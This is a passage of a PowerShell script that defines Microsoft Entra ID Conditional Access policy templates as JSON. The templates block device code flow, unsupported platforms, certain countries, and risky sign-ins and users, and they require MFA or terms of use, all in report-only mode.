    $CustomObject | Add-Member -MemberType NoteProperty -Name "Description" -Value "This policy blocks users from signing in with OAuth 2.0 device authorization grant flow. https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-device-code"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonTemplate" -Value @"
{
    "sessionControls": null,
    "conditions": {
        "platforms": null,
        "userRiskLevels": [],
        "clientApplications": null,
        "times": null,
        "deviceStates": null,
        "users": {
            "includeGuestsOrExternalUsers": null,
            "includeGroups": [],
            "excludeGuestsOrExternalUsers": null,
            "includeUsers": [
                "All"
            ],
            "excludeUsers": [],
            "excludeGroups": [
                "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP",
                "ENTRAGROUP_Excluded from Device Code Auth Flow Block_ENTRAGROUP"
            ],
            "excludeRoles": [],
            "includeRoles": []
        },
        "devices": null,
        "locations": null,
        "authenticationFlows": {
            "transferMethods": "deviceCodeFlow,authenticationTransfer"
        },
        "clientAppTypes": [
            "all"
        ],
        "applications": {
            "applicationFilter": null,
            "excludeApplications": [],
            "includeUserActions": [],
            "includeApplications": [
                "All"
            ],
            "includeAuthenticationContextClassReferences": []
        },
        "signInRiskLevels": []
    },
    "displayName": "$AddCustomPrefix`GLOBAL - 1020 - BLOCK - Device Code Auth Flow",
    "state": "enabledForReportingButNotEnforced",
    "templateId": null,
    "grantControls": {
        "operator": "OR",
        "builtInControls": [
            "block"
        ],
        "customAuthenticationFactors": [],
        "termsOfUse": [],
        "authenticationStrength": null
    }
}
"@
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonResult" -Value ""
    $ConditionalAccessTemplates += $CustomObject

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value "1030"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value "$AddCustomPrefix`GLOBAL - 1030 - BLOCK - Unsupported Device Platforms"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Description" -Value "Block unsupported platforms like Windows Phone, Linux, and other OS variants. Note: Device platform detection is a best effort security signal based on the user agent string and can be spoofed. Always combine this with additional signals like MFA and/or device authentication."
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonTemplate" -Value @"
{
    "sessionControls": null,
    "conditions": {
        "platforms": {
            "includePlatforms": [
                "all"
            ],
            "excludePlatforms": [
                "android",
                "iOS",
                "windows",
                "macOS"
            ]
        },
        "userRiskLevels": [],
        "clientApplications": null,
        "times": null,
        "deviceStates": null,
        "users": {
            "includeGuestsOrExternalUsers": null,
            "includeGroups": [],
            "excludeGuestsOrExternalUsers": null,
            "includeUsers": [
                "All"
            ],
            "excludeUsers": [],
            "excludeGroups": [
                "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP",
                "ENTRAGROUP_Excluded from Legacy Authentication Block_ENTRAGROUP"
            ],
            "excludeRoles": [],
            "includeRoles": []
        },
        "devices": null,
        "locations": null,
        "clientAppTypes": [
            "all"
        ],
        "applications": {
            "applicationFilter": null,
            "excludeApplications": [],
            "includeUserActions": [],
            "includeApplications": [
                "All"
            ],
            "includeAuthenticationContextClassReferences": []
        },
        "signInRiskLevels": []
    },
    "displayName": "$AddCustomPrefix`GLOBAL - 1030 - BLOCK - Unsupported Device Platforms",
    "state": "enabledForReportingButNotEnforced",
    "templateId": null,
    "grantControls": {
        "operator": "OR",
        "builtInControls": [
            "block"
        ],
        "customAuthenticationFactors": [],
        "termsOfUse": [],
        "authenticationStrength": null
    }
}
"@
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonResult" -Value ""
    $ConditionalAccessTemplates += $CustomObject

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value "1031"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value "$AddCustomPrefix`GLOBAL - 1031 - BLOCK - Unsupported Device Platforms (including Linux)"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Description" -Value "Block unsupported platforms like Windows Phone, and other OS variants. Note: Device platform detection is a best effort security signal based on the user agent string and can be spoofed. Always combine this with additional signals like MFA and/or device authentication."
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonTemplate" -Value @"
{
    "sessionControls": null,
    "conditions": {
        "platforms": {
            "includePlatforms": [
                "all"
            ],
            "excludePlatforms": [
                "android",
                "iOS",
                "windows",
                "macOS",
                "linux"
            ]
        },
        "userRiskLevels": [],
        "clientApplications": null,
        "times": null,
        "deviceStates": null,
        "users": {
            "includeGuestsOrExternalUsers": null,
            "includeGroups": [],
            "excludeGuestsOrExternalUsers": null,
            "includeUsers": [
                "All"
            ],
            "excludeUsers": [],
            "excludeGroups": [
                "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP",
                "ENTRAGROUP_Excluded from Legacy Authentication Block_ENTRAGROUP"
            ],
            "excludeRoles": [],
            "includeRoles": []
        },
        "devices": null,
        "locations": null,
        "clientAppTypes": [
            "all"
        ],
        "applications": {
            "applicationFilter": null,
            "excludeApplications": [],
            "includeUserActions": [],
            "includeApplications": [
                "All"
            ],
            "includeAuthenticationContextClassReferences": []
        },
        "signInRiskLevels": []
    },
    "displayName": "$AddCustomPrefix`GLOBAL - 1031 - BLOCK - Unsupported Device Platforms",
    "state": "enabledForReportingButNotEnforced",
    "templateId": null,
    "grantControls": {
        "operator": "OR",
        "builtInControls": [
            "block"
        ],
        "customAuthenticationFactors": [],
        "termsOfUse": [],
        "authenticationStrength": null
    }
}
"@
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonResult" -Value ""
    $ConditionalAccessTemplates += $CustomObject
    
    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value "1040"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value "$AddCustomPrefix`GLOBAL - 1040 - BLOCK - All Countries Except Allowed"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Description" -Value "This global policy blocks all connections from countries not in the Allowed countries whitelist. You should only allow countries where you expect your users to sign in from. This is not a strong security solution since attackers will easily bypass this with a proxy service, however, this effectively blocks a lot of the automated noise in the cloud."
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonTemplate" -Value @"
{
    "sessionControls": null,
    "conditions": {
        "platforms": null,
        "userRiskLevels": [],
        "clientApplications": null,
        "times": null,
        "locations": {
            "excludeLocations": [
                "ENTRACOUNTRYLIST_Allowed CountriesxxSExxNOxxDKxxFI_ENTRACOUNTRYLIST"
            ],
            "includeLocations": [
                "All"
            ]
        },
        "deviceStates": null,
        "users": {
            "includeGuestsOrExternalUsers": null,
            "includeGroups": [],
            "excludeGuestsOrExternalUsers": null,
            "includeUsers": [
                "All"
            ],
            "excludeUsers": [],
            "excludeGroups": [
                "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP",
                "ENTRAGROUP_Excluded from Country Block List_ENTRAGROUP"
            ],
            "excludeRoles": [],
            "includeRoles": []
        },
        "devices": null,
        "clientAppTypes": [
            "all"
        ],
        "applications": {
            "applicationFilter": null,
            "excludeApplications": [],
            "includeUserActions": [],
            "includeApplications": [
                "All"
            ],
            "includeAuthenticationContextClassReferences": []
        },
        "signInRiskLevels": []
    },
    "displayName": "$AddCustomPrefix`GLOBAL - 1040 - BLOCK - Countries not Allowed",
    "state": "enabledForReportingButNotEnforced",
    "templateId": null,
    "grantControls": {
        "operator": "OR",
        "builtInControls": [
            "block"
        ],
        "customAuthenticationFactors": [],
        "termsOfUse": [],
        "authenticationStrength": null
    }
}
"@
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonResult" -Value ""
    $ConditionalAccessTemplates += $CustomObject

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value "1050"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value "$AddCustomPrefix`GLOBAL - 1050 - BLOCK - High-Risk Countries"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Description" -Value "This global policy blocks all connections from countries in the High-Risk Countries list. This is not a strong security solution since attackers will easily bypass this with a proxy service, however, this effectively blocks a lot of the automated noise in the cloud."
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonTemplate" -Value @"
{
    "sessionControls": null,
    "conditions": {
        "platforms": null,
        "userRiskLevels": [],
        "clientApplications": null,
        "times": null,
        "locations": {
            "excludeLocations": [],
            "includeLocations": [
                "ENTRACOUNTRYLIST_High-Risk CountriesxxKPxxRUxxIR_ENTRACOUNTRYLIST"
            ]
        },
        "deviceStates": null,
        "users": {
            "includeGuestsOrExternalUsers": null,
            "includeGroups": [],
            "excludeGuestsOrExternalUsers": null,
            "includeUsers": [
                "All"
            ],
            "excludeUsers": [],
            "excludeGroups": [
                "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP"
            ],
            "excludeRoles": [],
            "includeRoles": []
        },
        "devices": null,
        "clientAppTypes": [
            "all"
        ],
        "applications": {
            "applicationFilter": null,
            "excludeApplications": [],
            "includeUserActions": [],
            "includeApplications": [
                "All"
            ],
            "includeAuthenticationContextClassReferences": []
        },
        "signInRiskLevels": []
    },
    "displayName": "$AddCustomPrefix`GLOBAL - 1050 - BLOCK - High-Risk Countries",
    "state": "enabledForReportingButNotEnforced",
    "templateId": null,
    "grantControls": {
        "operator": "OR",
        "builtInControls": [
            "block"
        ],
        "customAuthenticationFactors": [],
        "termsOfUse": [],
        "authenticationStrength": null
    }
}
"@
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonResult" -Value ""
    $ConditionalAccessTemplates += $CustomObject

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value "1051"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value "$AddCustomPrefix`GLOBAL - 1051 - BLOCK - High-Risk Countries (including China)"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Description" -Value "This global policy blocks all connections from countries in the High-Risk Countries list. This is not a strong security solution since attackers will easily bypass this with a proxy service, however, this effectively blocks a lot of the automated noise in the cloud."
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonTemplate" -Value @"
{
    "sessionControls": null,
    "conditions": {
        "platforms": null,
        "userRiskLevels": [],
        "clientApplications": null,
        "times": null,
        "locations": {
            "excludeLocations": [],
            "includeLocations": [
                "ENTRACOUNTRYLIST_High-Risk CountriesxxKPxxRUxxIRxxCN_ENTRACOUNTRYLIST"
            ]
        },
        "deviceStates": null,
        "users": {
            "includeGuestsOrExternalUsers": null,
            "includeGroups": [],
            "excludeGuestsOrExternalUsers": null,
            "includeUsers": [
                "All"
            ],
            "excludeUsers": [],
            "excludeGroups": [
                "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP"
            ],
            "excludeRoles": [],
            "includeRoles": []
        },
        "devices": null,
        "clientAppTypes": [
            "all"
        ],
        "applications": {
            "applicationFilter": null,
            "excludeApplications": [],
            "includeUserActions": [],
            "includeApplications": [
                "All"
            ],
            "includeAuthenticationContextClassReferences": []
        },
        "signInRiskLevels": []
    },
    "displayName": "$AddCustomPrefix`GLOBAL - 1051 - BLOCK - High-Risk Countries",
    "state": "enabledForReportingButNotEnforced",
    "templateId": null,
    "grantControls": {
        "operator": "OR",
        "builtInControls": [
            "block"
        ],
        "customAuthenticationFactors": [],
        "termsOfUse": [],
        "authenticationStrength": null
    }
}
"@
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonResult" -Value ""
    $ConditionalAccessTemplates += $CustomObject

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value "1060"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value "$AddCustomPrefix`GLOBAL - 1060 - BLOCK - Service Accounts (Trusted Locations Excluded)"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Description" -Value "Block service accounts (real Entra ID user accounts used by non-humans) from untrusted IP addresses. Service accounts can only connect from allowed IP addresses, but without MFA requirement. Only use service accounts as a last resort!"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonTemplate" -Value @"
{
    "sessionControls": null,
    "conditions": {
        "platforms": null,
        "userRiskLevels": [],
        "clientApplications": null,
        "times": null,
        "locations": {
            "excludeLocations": [
                "ENTRAIPLIST_Service Accounts Trusted IPs_ENTRAIPLIST"
            ],
            "includeLocations": [
                "All"
            ]
        },
        "deviceStates": null,
        "users": {
            "includeGuestsOrExternalUsers": null,
            "includeGroups": [
                "ENTRAGROUP_Conditional Access Service Accounts_ENTRAGROUP"
            ],
            "excludeGuestsOrExternalUsers": null,
            "includeUsers": [],
            "excludeUsers": [],
            "excludeGroups": [
                "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP"
            ],
            "excludeRoles": [],
            "includeRoles": []
        },
        "devices": null,
        "clientAppTypes": [
            "all"
        ],
        "applications": {
            "applicationFilter": null,
            "excludeApplications": [],
            "includeUserActions": [],
            "includeApplications": [
                "All"
            ],
            "includeAuthenticationContextClassReferences": []
        },
        "signInRiskLevels": []
    },
    "displayName": "$AddCustomPrefix`GLOBAL - 1060 - BLOCK - Service Accounts (Trusted Locations Excluded)",
    "state": "enabledForReportingButNotEnforced",
    "templateId": null,
    "grantControls": {
        "operator": "OR",
        "builtInControls": [
            "block"
        ],
        "customAuthenticationFactors": [],
        "termsOfUse": [],
        "authenticationStrength": null
    }
}
"@
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonResult" -Value ""
    $ConditionalAccessTemplates += $CustomObject

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value "1070"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value "$AddCustomPrefix`GLOBAL - 1070 - BLOCK - Explicitly Blocked Cloud Apps"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Description" -Value "This policy can be used to explicitly block certain cloud apps across the organisation. This is handy if you want to permanently block certain apps, or temporary block unwanted apps, for example, if there is a known critical security flaw."
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonTemplate" -Value @"
{
    "sessionControls": null,
    "conditions": {
        "platforms": null,
        "userRiskLevels": [],
        "clientApplications": null,
        "times": null,
        "deviceStates": null,
        "users": {
            "includeGuestsOrExternalUsers": null,
            "includeGroups": [],
            "excludeGuestsOrExternalUsers": null,
            "includeUsers": [
                "All"
            ],
            "excludeUsers": [],
            "excludeGroups": [
                "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP"
            ],
            "excludeRoles": [],
            "includeRoles": []
        },
        "devices": null,
        "locations": null,
        "clientAppTypes": [
            "all"
        ],
        "applications": {
            "applicationFilter": null,
            "excludeApplications": [],
            "includeUserActions": [],
            "includeApplications": [
                "None"
            ],
            "includeAuthenticationContextClassReferences": []
        },
        "signInRiskLevels": []
    },
    "displayName": "$AddCustomPrefix`GLOBAL - 1070 - BLOCK - Explicitly Blocked Cloud Apps",
    "state": "enabledForReportingButNotEnforced",
    "templateId": null,
    "grantControls": {
        "operator": "OR",
        "builtInControls": [
            "block"
        ],
        "customAuthenticationFactors": [],
        "termsOfUse": [],
        "authenticationStrength": null
    }
}
"@
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonResult" -Value ""
    $ConditionalAccessTemplates += $CustomObject

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value "1080"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value "$AddCustomPrefix`GLOBAL - 1080 - BLOCK - Guest Access to Sensitive Apps"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Description" -Value "Block guests from accessing sensitive apps like Microsoft Admin Portals."
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonTemplate" -Value @"
{
    "sessionControls": null,
    "conditions": {
        "platforms": null,
        "userRiskLevels": [],
        "clientApplications": null,
        "times": null,
        "deviceStates": null,
        "users": {
            "includeGuestsOrExternalUsers": {
                "externalTenants": {
                    "membershipKind": "all",
                    "@odata.type": "#microsoft.graph.conditionalAccessAllExternalTenants"
                },
                "guestOrExternalUserTypes": "internalGuest,b2bCollaborationGuest,b2bCollaborationMember,b2bDirectConnectUser,otherExternalUser"
            },
            "includeGroups": [],
            "excludeGuestsOrExternalUsers": null,
            "includeUsers": [],
            "excludeUsers": [],
            "excludeGroups": [
                "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP"
            ],
            "excludeRoles": [],
            "includeRoles": []
        },
        "devices": null,
        "locations": null,
        "clientAppTypes": [
            "all"
        ],
        "applications": {
            "applicationFilter": null,
            "excludeApplications": [],
            "includeUserActions": [],
            "includeApplications": [
                "MicrosoftAdminPortals",
                "797f4846-ba00-4fd7-ba43-dac1f8f63013"
            ],
            "includeAuthenticationContextClassReferences": []
        },
        "signInRiskLevels": []
    },
    "displayName": "$AddCustomPrefix`GLOBAL - 1080 - BLOCK - Guest Access to Sensitive Apps",
    "state": "enabledForReportingButNotEnforced",
    "templateId": null,
    "grantControls": {
        "operator": "OR",
        "builtInControls": [
            "block"
        ],
        "customAuthenticationFactors": [],
        "termsOfUse": [],
        "authenticationStrength": null
    }
}
"@
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonResult" -Value ""
    $ConditionalAccessTemplates += $CustomObject

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value "1090"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value "$AddCustomPrefix`GLOBAL - 1090 - BLOCK - High-Risk Sign-Ins"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Description" -Value "This global policy blocks all high-risk authentications detected by Entra ID Protection. This is called risk-based Conditional Access. Note that this policy requires Entra ID P2 for all targeted users."
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonTemplate" -Value @"
{
    "sessionControls": null,
    "conditions": {
        "platforms": null,
        "userRiskLevels": [],
        "clientApplications": null,
        "times": null,
        "deviceStates": null,
        "users": {
            "includeGuestsOrExternalUsers": null,
            "includeGroups": [],
            "excludeGuestsOrExternalUsers": null,
            "includeUsers": [
                "All"
            ],
            "excludeUsers": [],
            "excludeGroups": [
                "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP"
            ],
            "excludeRoles": [],
            "includeRoles": []
        },
        "devices": null,
        "locations": null,
        "clientAppTypes": [
            "all"
        ],
        "applications": {
            "applicationFilter": null,
            "excludeApplications": [],
            "includeUserActions": [],
            "includeApplications": [
                "All"
            ],
            "includeAuthenticationContextClassReferences": []
        },
        "signInRiskLevels": [
            "high"
        ]
    },
    "displayName": "$AddCustomPrefix`GLOBAL - 1090 - BLOCK - High-Risk Sign-Ins",
    "state": "enabledForReportingButNotEnforced",
    "templateId": null,
    "grantControls": {
        "operator": "OR",
        "builtInControls": [
            "block"
        ],
        "customAuthenticationFactors": [],
        "termsOfUse": [],
        "authenticationStrength": null
    }
}
"@
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonResult" -Value ""
    $ConditionalAccessTemplates += $CustomObject

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value "1100"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value "$AddCustomPrefix`GLOBAL - 1100 - BLOCK - High-Risk Users"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Description" -Value "Same as above but looks at the user risk level instead of the sign-in risk level. For example, many medium risk sign-ins can result in a high-risk user."
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonTemplate" -Value @"
{
    "sessionControls": null,
    "conditions": {
        "platforms": null,
        "userRiskLevels": [
            "high"
        ],
        "clientApplications": null,
        "times": null,
        "deviceStates": null,
        "users": {
            "includeGuestsOrExternalUsers": null,
            "includeGroups": [],
            "excludeGuestsOrExternalUsers": null,
            "includeUsers": [
                "All"
            ],
            "excludeUsers": [],
            "excludeGroups": [
                "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP"
            ],
            "excludeRoles": [],
            "includeRoles": []
        },
        "devices": null,
        "locations": null,
        "clientAppTypes": [
            "all"
        ],
        "applications": {
            "applicationFilter": null,
            "excludeApplications": [],
            "includeUserActions": [],
            "includeApplications": [
                "All"
            ],
            "includeAuthenticationContextClassReferences": []
        },
        "signInRiskLevels": []
    },
    "displayName": "$AddCustomPrefix`GLOBAL - 1100 - BLOCK - High-Risk Users",
    "state": "enabledForReportingButNotEnforced",
    "templateId": null,
    "grantControls": {
        "operator": "OR",
        "builtInControls": [
            "block"
        ],
        "customAuthenticationFactors": [],
        "termsOfUse": [],
        "authenticationStrength": null
    }
}
"@
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonResult" -Value ""
    $ConditionalAccessTemplates += $CustomObject

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value "2010"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value "$AddCustomPrefix`GLOBAL - 2010 - GRANT - Medium-Risk Sign-Ins"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Description" -Value "This global policy enforces MFA on all medium-risk authentications detected by Entra ID Protection."
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonTemplate" -Value @"
{
    "sessionControls": {
        "cloudAppSecurity": null,
        "continuousAccessEvaluation": null,
        "applicationEnforcedRestrictions": null,
        "signInFrequency": {
            "type": null,
            "value": null,
            "frequencyInterval": "everyTime",
            "authenticationType": "primaryAndSecondaryAuthentication",
            "isEnabled": true
        },
        "secureSignInSession": null,
        "persistentBrowser": null,
        "disableResilienceDefaults": null
    },
    "conditions": {
        "platforms": null,
        "userRiskLevels": [],
        "clientApplications": null,
        "times": null,
        "deviceStates": null,
        "users": {
            "includeGuestsOrExternalUsers": null,
            "includeGroups": [],
            "excludeGuestsOrExternalUsers": null,
            "includeUsers": [
                "All"
            ],
            "excludeUsers": [],
            "excludeGroups": [
                "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP"
            ],
            "excludeRoles": [],
            "includeRoles": []
        },
        "devices": null,
        "locations": null,
        "clientAppTypes": [
            "all"
        ],
        "applications": {
            "applicationFilter": null,
            "excludeApplications": [],
            "includeUserActions": [],
            "includeApplications": [
                "All"
            ],
            "includeAuthenticationContextClassReferences": []
        },
        "signInRiskLevels": [
            "medium"
        ]
    },
    "displayName": "$AddCustomPrefix`GLOBAL - 2010 - GRANT - Medium-Risk Sign-ins",
    "state": "enabledForReportingButNotEnforced",
    "templateId": null,
    "grantControls": {
        "operator": "OR",
        "builtInControls": [],
        "customAuthenticationFactors": [],
        "termsOfUse": [],
        "authenticationStrength": {
            "id": "00000000-0000-0000-0000-000000000002"
        }
    }
}
"@
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonResult" -Value ""
    $ConditionalAccessTemplates += $CustomObject

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value "2020"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value "$AddCustomPrefix`GLOBAL - 2020 - GRANT - Medium-Risk Users"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Description" -Value "Same as above but looks at the user risk level instead of the sign-in risk level."
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonTemplate" -Value @"
{
    "sessionControls": {
        "cloudAppSecurity": null,
        "continuousAccessEvaluation": null,
        "applicationEnforcedRestrictions": null,
        "signInFrequency": {
            "type": null,
            "value": null,
            "frequencyInterval": "everyTime",
            "authenticationType": "primaryAndSecondaryAuthentication",
            "isEnabled": true
        },
        "secureSignInSession": null,
        "persistentBrowser": null,
        "disableResilienceDefaults": null
    },
    "conditions": {
        "platforms": null,
        "userRiskLevels": [
            "medium"
        ],
        "clientApplications": null,
        "times": null,
        "deviceStates": null,
        "users": {
            "includeGuestsOrExternalUsers": null,
            "includeGroups": [],
            "excludeGuestsOrExternalUsers": null,
            "includeUsers": [
                "All"
            ],
            "excludeUsers": [],
            "excludeGroups": [
                "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP"
            ],
            "excludeRoles": [],
            "includeRoles": []
        },
        "devices": null,
        "locations": null,
        "clientAppTypes": [
            "all"
        ],
        "applications": {
            "applicationFilter": null,
            "excludeApplications": [],
            "includeUserActions": [],
            "includeApplications": [
                "All"
            ],
            "includeAuthenticationContextClassReferences": []
        },
        "signInRiskLevels": []
    },
    "displayName": "$AddCustomPrefix`GLOBAL - 2020 - GRANT - Medium-Risk Users",
    "state": "enabledForReportingButNotEnforced",
    "templateId": null,
    "grantControls": {
        "operator": "OR",
        "builtInControls": [],
        "customAuthenticationFactors": [],
        "termsOfUse": [],
        "authenticationStrength": {
            "id": "00000000-0000-0000-0000-000000000002"
        }
    }
}
"@
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonResult" -Value ""
    $ConditionalAccessTemplates += $CustomObject

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value "2030"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value "$AddCustomPrefix`GLOBAL - 2030 - GRANT - Device Registration"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Description" -Value "This global policy enforces MFA for all Entra ID device registrations performed from a non-corporate network."
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonTemplate" -Value @"
{
    "sessionControls": null,
    "conditions": {
        "platforms": null,
        "userRiskLevels": [],
        "clientApplications": null,
        "times": null,
        "deviceStates": null,
        "users": {
            "includeGuestsOrExternalUsers": null,
            "includeGroups": [],
            "excludeGuestsOrExternalUsers": null,
            "includeUsers": [
                "All"
            ],
            "excludeUsers": [],
            "excludeGroups": [
                "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP"
            ],
            "excludeRoles": [],
            "includeRoles": []
        },
        "devices": null,
        "locations": null,
        "clientAppTypes": [
            "all"
        ],
        "applications": {
            "applicationFilter": null,
            "excludeApplications": [],
            "includeUserActions": [
                "urn:user:registerdevice"
            ],
            "includeApplications": [],
            "includeAuthenticationContextClassReferences": []
        },
        "signInRiskLevels": []
    },
    "displayName": "$AddCustomPrefix`GLOBAL - 2030 - GRANT - Device Registration",
    "state": "enabledForReportingButNotEnforced",
    "templateId": null,
    "grantControls": {
        "operator": "OR",
        "builtInControls": [],
        "customAuthenticationFactors": [],
        "termsOfUse": [],
        "authenticationStrength": {
            "id": "00000000-0000-0000-0000-000000000002"
        }
    }
}
"@
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonResult" -Value ""
    $ConditionalAccessTemplates += $CustomObject

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value "2040"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value "$AddCustomPrefix`GLOBAL - 2040 - GRANT - Terms of Use (All users)"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Description" -Value "This global policy forces Terms of Use, like an Terms of Use or NDA, on all users. Users must read and agree to this policy the first time they sign in before they're granted access."
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonTemplate" -Value @"
{
    "sessionControls": null,
    "conditions": {
        "platforms": null,
        "userRiskLevels": [],
        "clientApplications": null,
        "times": null,
        "deviceStates": null,
        "users": {
            "includeGuestsOrExternalUsers": null,
            "includeGroups": [],
            "excludeGuestsOrExternalUsers": null,
            "includeUsers": [
                "All"
            ],
            "excludeUsers": [],
            "excludeGroups": [
                "ENTRAGROUP_Excluded from Conditional Access_ENTRAGROUP",
                "ENTRAGROUP_Conditional Access Service Accounts_ENTRAGROUP"
            ],
            "excludeRoles": [
                "d29b2b05-8046-44ba-8758-1e26182fcf32"
            ],
            "includeRoles": []
        },
        "devices": null,
        "locations": null,
        "clientAppTypes": [
            "all"
        ],
        "applications": {
            "applicationFilter": null,
            "excludeApplications": [],
            "includeUserActions": [],
            "includeApplications": [
                "All"
            ],
            "includeAuthenticationContextClassReferences": []
        },
        "signInRiskLevels": []
    },
    "displayName": "$AddCustomPrefix`GLOBAL - 2040 - GRANT - Terms of Use (All users)",
    "state": "enabledForReportingButNotEnforced",
    "templateId": null,
    "grantControls": {
        "operator": "OR",
        "builtInControls": [],
        "customAuthenticationFactors": [],
        "termsOfUse": [
            "ENTRATERMSOFUSE_Terms of Use_ENTRATERMSOFUSE"
        ],
        "authenticationStrength": null
    }
}
"@
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonResult" -Value ""
    $ConditionalAccessTemplates += $CustomObject

    $CustomObject = New-Object -TypeName psobject
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Id" -Value "2041"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Name" -Value "$AddCustomPrefix`GLOBAL - 2041 - GRANT - Terms of Use (Guests only)"
    $CustomObject | Add-Member -MemberType NoteProperty -Name "Description" -Value "This global policy forces Terms of Use, like an Terms of Use or NDA, on all guest users. Guests must read and agree to this policy the first time they sign in before they're granted access."
    $CustomObject | Add-Member -MemberType NoteProperty -Name "JsonTemplate" -Value @"
{
    "sessionControls": null,
    "conditions": {
        "platforms": null,
        "userRiskLevels": [],
        "clientApplications": null,
        "times": null,
        "deviceStates": null,
        "users": {
            "includeGuestsOrExternalUsers": {
                "externalTenants": {
                    "membershipKind": "all",
                    "@odata.type": "#microsoft.graph.conditionalAccessAllExternalTenants"
                },
                "guestOrExternalUserTypes": "internalGuest,b2bCollaborationGuest,b2bCollaborationMember,b2bDirectConnectUser,otherExternalUser"
            },
            "includeGroups": [],
            "excludeGuestsOrExternalUsers": null,
            "includeUsers": [],
            "excludeUsers": [],
            "excludeGroups": [
